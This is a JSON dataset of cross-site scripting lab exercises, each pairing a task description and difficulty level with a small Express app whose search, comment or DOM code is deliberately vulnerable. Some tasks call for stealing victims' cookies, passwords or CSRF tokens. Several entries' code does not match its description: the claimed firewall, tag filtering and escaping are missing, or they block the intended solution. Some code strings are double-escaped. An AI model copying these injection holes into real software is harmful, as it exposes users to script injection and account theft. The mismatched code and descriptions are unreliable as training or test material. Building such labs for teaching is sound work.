[
  {
    "Lab scenario": "Reflected XSS into HTML context with nothing encoded",
    "Lab Description": "This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>Search Page</h1>\n    <form action=\"/search\" method=\"GET\">\n      <input type=\"text\" name=\"q\" placeholder=\"Search...\">\n      <button type=\"submit\">Search</button>\n    </form>\n  `);\n});\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  res.send(`<h2>Search results for: ${query}</h2>`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
    "Lab scenario": "Stored XSS into HTML context with nothing encoded",
    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve the lab, submit a comment that calls the alert function when the blog post is viewed.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nlet comments = [];\n\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>Blog Post</h1>\n    <p>This is a sample blog post. Leave a comment below.</p>\n    <h2>Comments</h2>\n    <ul>${comments.map(c => `<li>${c}</li>`).join('')}</ul>\n    <form action=\"/comment\" method=\"POST\">\n      <input type=\"text\" name=\"comment\" placeholder=\"Write a comment...\">\n      <button type=\"submit\">Submit</button>\n    </form>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/');\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
    
  },
  {
    "Lab scenario": "DOM XSS in document.write sink using source location.search",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>Search Page</h1>\n    <form action=\"/search\">\n      <input type=\"text\" name=\"q\" placeholder=\"Search...\">\n      <button type=\"submit\">Search</button>\n    </form>\n    <script>\n      if (location.search) {\n        document.write(\"<p>Results for: \" + location.search.substring(3) + \"</p>\");\n      }\n    </script>\n  `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
    "Lab scenario": "DOM XSS in innerHTML sink using source location.search",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "medium",
      "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(\n    '<h1>Search Blog</h1>' +\n    '<form action=\"/search\" method=\"GET\">' +\n    '  <input type=\"text\" name=\"query\" placeholder=\"Search...\">' +\n    '  <input type=\"submit\" value=\"Search\">' +\n    '</form>' +\n    '<div id=\"results\"></div>' +\n    '<script>' +\n    '  const query = new URLSearchParams(window.location.search).get(\"query\");' +\n    '  if (query) {' +\n    '    document.getElementById(\"results\").innerHTML = \"You searched for: \" + query;' +\n    '  }' +\n    '</script>'\n  );\n});\n\napp.get('/search', (req, res) => {\n  const query = req.query.query || '';\n  res.redirect(`/?query=${encodeURIComponent(query)}`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
    "Lab scenario": "DOM XSS in jQuery anchor href attribute sink using location.search source",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.\nTo solve this lab, make the \"back\" link alert document.cookie.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(\n    '<h1>Submit Feedback</h1>' +\n    '<form action=\"/submit\" method=\"GET\">' +\n    '  <input type=\"text\" name=\"feedback\" placeholder=\"Your feedback...\">' +\n    '  <input type=\"submit\" value=\"Submit\">' +\n    '</form>' +\n    '<a id=\"backLink\" href=\"#\">Back</a>' +\n    '<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script>' +\n    '<script>' +\n    '  const params = new URLSearchParams(window.location.search);' +\n    '  const feedback = params.get(\"feedback\");' +\n    '  if (feedback) {' +\n    '    $(\"#backLink\").attr(\"href\", feedback);' +\n    '  }' +\n    '</script>'\n  );\n});\n\napp.get('/submit', (req, res) => {\n  const feedback = req.query.feedback || '';\n  res.redirect(`/?feedback=${encodeURIComponent(feedback)}`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
    "Lab scenario": "DOM XSS in jQuery selector sink using a hashchange event",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.\nTo solve the lab, deliver an exploit to the victim that calls the print() function in their browser.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(\n    '<h1>Blog Posts</h1>' +\n    '<div id=\"post1\"><h2>Post 1</h2><p>Content of post 1.</p></div>' +\n    '<div id=\"post2\"><h2>Post 2</h2><p>Content of post 2.</p></div>' +\n    '<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script>' +\n    '<script>' +\n    '  $(window).on(\"hashchange\", () => {' +\n    '    const post = location.hash.slice(1);' +\n    '    if (post) {' +\n    '      $(`#${post}`).get(0).scrollIntoView();' +\n    '    }' +\n    '  });' +\n    '</script>'\n  );\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
    "Lab scenario": "Reflected XSS into attribute with angle brackets HTML-encoded",
    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const searchQuery = req.query.search || '';\n  const encodedSearchQuery = searchQuery.replace(/</g, '&lt;').replace(/>/g, '&gt;');\n  res.send(\n    '<h1>Search Blog</h1>' +\n    '<form action=\"/\" method=\"GET\">' +\n    '  <input type=\"text\" name=\"search\" placeholder=\"Search...\">' +\n    '  <input type=\"submit\" value=\"Search\">' +\n    '</form>' +\n    `<p>You searched for: <span id=\"searchResult\">${encodedSearchQuery}</span></p>`\n  );\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});" 
  },
  {
    "Lab scenario": "Stored XSS into anchor href attribute with double quotes HTML-encoded",
    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nlet comments = [];\n\napp.get('/', (req, res) => {\n  res.send(\n    '<h1>Comments</h1>' +\n    '<form action=\"/comment\" method=\"POST\">' +\n    '  Name: <input type=\"text\" name=\"name\"><br>' +\n    '  Comment: <textarea name=\"comment\"></textarea><br>' +\n    '  <input type=\"submit\" value=\"Submit\">' +\n    '</form>' +\n    '<h2>Comments:</h2>' +\n    comments.map(comment => `<p><a href=\"${comment.name}\">${comment.name}</a>: ${comment.comment}</p>`).join('')\n  );\n});\n\napp.post('/comment', (req, res) => {\n  const name = req.body.name || 'Anonymous';\n  const comment = req.body.comment || '';\n  comments.push({ name, comment });\n  res.redirect('/');\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
    "Lab scenario": "Reflected XSS into a JavaScript string with angle brackets HTML encoded",
    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "medium",
    "src code": "const express = require('express');\\nconst app = express();\\n\\napp.get('/', (req, res) => {\\n  const searchQuery = req.query.search || '';\\n  const encodedSearchQuery = searchQuery.replace(/</g, '&lt;').replace(/>/g, '&gt;');\\n  res.send(\\n    '<h1>Search Blog</h1>' +\\n    '<form action=\"/\" method=\"GET\">' +\\n    '  <input type=\"text\" name=\"search\" placeholder=\"Search...\">' +\\n    '  <input type=\"submit\" value=\"Search\">' +\\n    '</form>' +\\n    '<script>' +\\n    `  var searchTerm = '${encodedSearchQuery}';` +\\n    '  console.log(\"Search term:\", searchTerm);' +\\n    '</script>'\\n  );\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n  console.log(`Lab running on http://localhost:${PORT}`);\\n});"
  },
  {
    "Lab scenario": "DOM XSS in document.write sink using source location.search inside a select element",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(\n    '<h1>Stock Checker</h1>' +\n    '<form action=\"/\" method=\"GET\">' +\n    '  <input type=\"text\" name=\"productId\" placeholder=\"Product ID\">' +\n    '  <input type=\"submit\" value=\"Check Stock\">' +\n    '</form>' +\n    '<script>' +\n    '  const params = new URLSearchParams(window.location.search);' +\n    '  const productId = params.get(\"productId\");' +\n    '  if (productId) {' +\n    '    document.write(\"<select>\");' +\n    '    document.write(\"<option>\" + productId + \"</option>\");' +\n    '    document.write(\"</select>\");' +\n    '  }' +\n    '</script>'\n  );\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
  },
  {
    "Lab scenario": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.\nAngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.\nTo solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const searchQuery = req.query.search || '';\n  const encodedSearchQuery = searchQuery.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\"/g, '&quot;');\n  res.send(\n    '<html ng-app>' +\n    '<h1>Search Blog</h1>' +\n    '<form action=\"/\" method=\"GET\">' +\n    '  <input type=\"text\" name=\"search\" placeholder=\"Search...\">' +\n    '  <input type=\"submit\" value=\"Search\">' +\n    '</form>' +\n    `<p>You searched for: <span ng-bind=\"${encodedSearchQuery}\"></span></p>` +\n    '<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js\"></script>' +\n    '</html>'\n  );\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
  },
  {
    "Lab scenario": "Reflected DOM XSS",
    "Lab Description": "This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.\nTo solve this lab, create an injection that calls the alert() function.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const searchQuery = req.query.search || '';\n  res.send(\n    '<h1>Search Blog</h1>' +\n    '<form action=\"/\" method=\"GET\">' +\n    '  <input type=\"text\" name=\"search\" placeholder=\"Search...\">' +\n    '  <input type=\"submit\" value=\"Search\">' +\n    '</form>' +\n    '<script>' +\n    '  const params = new URLSearchParams(window.location.search);' +\n    '  const searchTerm = params.get(\"search\");' +\n    '  if (searchTerm) {' +\n    '    document.write(\"<p>You searched for: \" + searchTerm + \"</p>\");' +\n    '  }' +\n    '</script>'\n  );\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
   
  },
  {
    "Lab scenario": "Stored DOM XSS",
    "Lab Description": "This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nlet comments = [];\n\napp.get('/', (req, res) => {\n  res.send(\n    '<h1>Blog Comments</h1>' +\n    '<form action=\"/comment\" method=\"POST\">' +\n    '  Name: <input type=\"text\" name=\"name\"><br>' +\n    '  Comment: <textarea name=\"comment\"></textarea><br>' +\n    '  <input type=\"submit\" value=\"Submit\">' +\n    '</form>' +\n    '<h2>Comments:</h2>' +\n    '<div id=\"comments\">' +\n    comments.map(comment => `<p><strong>${comment.name}</strong>: ${comment.comment}</p>`).join('') +\n    '</div>' +\n    '<script>' +\n    '  const commentDiv = document.getElementById(\"comments\");' +\n    '  commentDiv.innerHTML = commentDiv.innerHTML;' +\n    '</script>'\n  );\n});\n\napp.post('/comment', (req, res) => {\n  const name = req.body.name || 'Anonymous';\n  const comment = req.body.comment || '';\n  comments.push({ name, comment });\n  res.redirect('/');\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"

  },
  {
    "Lab scenario": "Reflected XSS into HTML context with most tags and attributes blocked",
    "Lab Description": "This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.\nTo solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.",
    "Vulnerability name": "Cross-site scripting",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q || '';\n    res.send(`<h1>Search Page</h1><p>Results for: ${query}</p>`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(\"Lab running on http://localhost:\" + PORT);\n});",
    "lab level": "medium"
  },
  {
    "Lab scenario": "Reflected XSS into HTML context with all tags blocked except custom ones",
    "Lab Description": "This lab blocks all HTML tags except custom ones.\nTo solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    let query = req.query.q || '';\n    query = query.replace(/</g, '&lt;').replace(/>/g, '&gt;'); // Blocks standard HTML tags\n    res.send(`<h1>Search Page</h1><p>Results for: ${query}</p>`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(\"Lab running on http://localhost:\" + PORT);\n});"
   
  },
  {
    "Lab scenario": "Reflected XSS with some SVG markup allowed",
    "Lab Description": "This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.\nTo solve the lab, perform a cross-site scripting attack that calls the alert() function.",
    "Vulnerability name": "Cross-site scripting",
        "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  res.send(`<h1>Search Results</h1><p>Results for: ${query}</p>`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"

  },
  {
    "Lab scenario": "Reflected XSS in canonical link tag",
    "Lab Description": "This lab reflects user input in a canonical link tag and escapes angle brackets.\nTo solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.\nTo assist with your exploit, you can assume that the simulated user will press the following key combinations:\nPlease note that the intended solution to this lab is only possible in Chrome.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  const query = req.query.q || '';\n  res.send(`<!DOCTYPE html>\n  <html>\n  <head>\n    <link rel=\"canonical\" href=\"https://example.com/?q=${query}\">\n  </head>\n  <body>\n    <h1>Welcome to the Lab</h1>\n    <p>Search for something...</p>\n  </body>\n  </html>`);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
  },
  {
    "Lab scenario": "Reflected XSS into a JavaScript string with single quote and backslash escaped",
    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "medium",
    "src code": "const express = require('express');\\nconst app = express();\\n\\napp.get('/', (req, res) => {\\n  const searchQuery = req.query.search || '';\\n  const escapedSearchQuery = searchQuery.replace(/'/g, '\\\\\\'').replace(/\\\\/g, '\\\\\\\\');\\n  res.send(\\n    '<h1>Search Blog</h1>' +\\n    '<form action=\"/\" method=\"GET\">' +\\n    '  <input type=\"text\" name=\"search\" placeholder=\"Search...\">' +\\n    '  <input type=\"submit\" value=\"Search\">' +\\n    '</form>' +\\n    '<script>' +\\n    `  var searchTerm = '${escapedSearchQuery}';` +\\n    '  console.log(\"Search term:\", searchTerm);' +\\n    '</script>'\\n  );\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n  console.log(`Lab running on http://localhost:${PORT}`);\\n});"
 
  },
  {
    "Lab scenario": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped",
    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
       "Vulnerability name": "Cross-site scripting",
         "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    let searchQuery = req.query.q || \"\";\n    \n    // Vulnerable JavaScript injection (Reflected XSS)\n    res.send(`\n        <script>\n            let userInput = '${searchQuery}';\n            document.write(\"Search results for: \" + userInput);\n        </script>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
  },
  {
    "Lab scenario": "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped",
    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve this lab, submit a comment that calls the alert function when the comment author name is clicked.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "medium",
      "src code": "const express = require('express');\\nconst bodyParser = require('body-parser');\\n\\nconst app = express();\\napp.use(bodyParser.urlencoded({ extended: true }));\\n\\nlet comments = []; // Stores user-submitted comments\\n\\napp.get('/', (req, res) => {\\n    let commentsList = comments.map(comment => \\n        `<p><b onclick='${comment.author}'>${comment.author}</b>: ${comment.text}</p>`\\n    ).join('');\\n    \\n    res.send(`\\n        <h1>Comment Section</h1>\\n        <form action=\"/comment\" method=\"POST\">\\n            <input type=\"text\" name=\"author\" placeholder=\"Your name\" required>\\n            <textarea name=\"text\" placeholder=\"Your comment\" required></textarea>\\n            <button type=\"submit\">Submit</button>\\n        </form>\\n        <h2>Comments:</h2>\\n        ${commentsList}\\n    `);\\n});\\n\\napp.post('/comment', (req, res) => {\\n    let author = req.body.author;\\n    let text = req.body.text;\\n    \\n    // Vulnerable stored XSS (does not sanitize input)\\n    comments.push({ author, text });\\n\\n    res.redirect('/');\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n    console.log(`Lab running on http://localhost:${PORT}`);\\n});"

  
  },
  {
    "Lab scenario": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",
    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const searchQuery = req.query.q || '';\n    res.send(`\n        <script>\n            let userInput = \\`${searchQuery}\\`;\n            document.write('<h1>Results for: ' + userInput + '</h1>');\n        </script>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
   
  },
  {
    "Lab scenario": "Exploiting cross-site scripting to steal cookies",
    "Lab Description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(cookieParser());\n\nlet comments = [];\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h1>Blog Post</h1>\n        <p>Leave a comment:</p>\n        <form action='/comment' method='POST'>\n            <input type='text' name='comment' />\n            <button type='submit'>Submit</button>\n        </form>\n        <h2>Comments:</h2>\n        <ul>\n            ${comments.map(c => `<li>${c}</li>`).join('')}\n        </ul>\n    `);\n});\n\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.redirect('/');\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
   
  },
  {
    "Lab scenario": "Exploiting cross-site scripting to capture passwords",
    "Lab Description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.",
    "Vulnerability name": "Cross-site scripting",
       "lab level": "hard",
    "src code": "const express = require('express');\\nconst bodyParser = require('body-parser');\\n\\nconst app = express();\\napp.use(bodyParser.urlencoded({ extended: true }));\\n\\nlet comments = []; // Stores user-submitted comments\\n\\napp.get('/', (req, res) => {\\n    let commentsList = comments.map(comment => \\n        `<p>${comment}</p>`\\n    ).join('');\\n    \\n    res.send(`\\n        <h1>Blog Comments</h1>\\n        <form action=\"/comment\" method=\"POST\">\\n            <textarea name=\"comment\" placeholder=\"Your comment\" required></textarea>\\n            <button type=\"submit\">Submit</button>\\n        </form>\\n        <h2>Comments:</h2>\\n        ${commentsList}\\n    `);\\n});\\n\\napp.post('/comment', (req, res) => {\\n    const comment = req.body.comment || '';\\n    comments.push(comment);\\n    res.redirect('/');\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n    console.log(`Lab running on http://localhost:${PORT}`);\\n});"
 
  },
  {
    "Lab scenario": "Exploiting XSS to bypass CSRF defenses",
    "Lab Description": "This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.\nYou can log in to your own account using the following credentials: wiener:peter",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "hard" ,
    "src code": "const express = require('express');\\nconst bodyParser = require('body-parser');\\nconst cookieParser = require('cookie-parser');\\n\\nconst app = express();\\napp.use(bodyParser.urlencoded({ extended: true }));\\napp.use(cookieParser());\\n\\nlet comments = []; // Stores user-submitted comments\\n\\napp.get('/', (req, res) => {\\n    let commentsList = comments.map(comment => \\n        `<p>${comment}</p>`\\n    ).join('');\\n    \\n    res.send(`\\n        <h1>Blog Comments</h1>\\n        <form action=\"/comment\" method=\"POST\">\\n            <textarea name=\"comment\" placeholder=\"Your comment\" required></textarea>\\n            <button type=\"submit\">Submit</button>\\n        </form>\\n        <h2>Comments:</h2>\\n        ${commentsList}\\n    `);\\n});\\n\\napp.post('/comment', (req, res) => {\\n    const comment = req.body.comment || '';\\n    comments.push(comment);\\n    res.redirect('/');\\n});\\n\\napp.get('/change-email', (req, res) => {\\n    const csrfToken = 'random-csrf-token'; // Simulated CSRF token\\n    res.send(`\\n        <h1>Change Email</h1>\\n        <form action=\"/update-email\" method=\"POST\">\\n            <input type=\"hidden\" name=\"csrf\" value=\"${csrfToken}\">\\n            <input type=\"email\" name=\"email\" placeholder=\"New email\" required>\\n            <button type=\"submit\">Update Email</button>\\n        </form>\\n    `);\\n});\\n\\napp.post('/update-email', (req, res) => {\\n    const csrfToken = req.body.csrf;\\n    const email = req.body.email;\\n    \\n    if (csrfToken === 'random-csrf-token') {\\n        res.send(`Email updated to: ${email}`);\\n    } else {\\n        res.status(403).send('Invalid CSRF token');\\n    }\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n    console.log(`Lab running on http://localhost:${PORT}`);\\n});"
   
  },
  {
    "Lab scenario": "Reflected XSS with AngularJS sandbox escape without strings",
    "Lab Description": "This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.\nTo solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.",
    "Vulnerability name": "Cross-site scripting",
      "lab level": "hard",
    "src code": "const express = require('express');\\nconst app = express();\\n\\napp.get('/', (req, res) => {\\n    const searchQuery = req.query.search || '';\\n    res.send(`\\n        <h1>Search Blog</h1>\\n        <form action=\"/\" method=\"GET\">\\n            <input type=\"text\" name=\"search\" placeholder=\"Search...\">\\n            <input type=\"submit\" value=\"Search\">\\n        </form>\\n        <div ng-app>\\n            <p>You searched for: {{ ${searchQuery} }}</p>\\n        </div>\\n        <script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js\"></script>\\n    `);\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n    console.log(`Lab running on http://localhost:${PORT}`);\\n});"
  
  },
  {
    "Lab scenario": "Reflected XSS with AngularJS sandbox escape and CSP",
    "Lab Description": "This lab uses CSP and AngularJS.\nTo solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "hard",
    "src code": "const express = require('express');\\nconst app = express();\\n\\napp.get('/', (req, res) => {\\n    const searchQuery = req.query.search || '';\\n    res.set('Content-Security-Policy', \"default-src 'self'; script-src 'self' https://ajax.googleapis.com;\");\\n    res.send(`\\n        <h1>Search Blog</h1>\\n        <form action=\"/\" method=\"GET\">\\n            <input type=\"text\" name=\"search\" placeholder=\"Search...\">\\n            <input type=\"submit\" value=\"Search\">\\n        </form>\\n        <div ng-app>\\n            <p>You searched for: {{ ${searchQuery} }}</p>\\n        </div>\\n        <script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js\"></script>\\n    `);\\n});\\n\\nconst PORT = 3000;\\napp.listen(PORT, () => {\\n    console.log(`Lab running on http://localhost:${PORT}`);\\n});"
   
  },
  {
    "Lab scenario": "Reflected XSS with event handlers and href attributes blocked",
    "Lab Description": "This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.\nTo solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.\nNote that you need to label your vector with the word \"Click\" in order to induce the simulated lab user to click your vector. For example:\n<a href=\"\">Click me</a>",
    "Vulnerability name": "Cross-site scripting",
       "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const searchQuery = req.query.q || '';\n    res.send(`\n        <h1>Search Page</h1>\n        <p>Results for: ${searchQuery}</p>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});"
 
  },
  {
    "Lab scenario": "Reflected XSS in a JavaScript URL with some characters blocked",
    "Lab Description": "This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.",
    "Vulnerability name": "Cross-site scripting",
     "lab level": "medium",
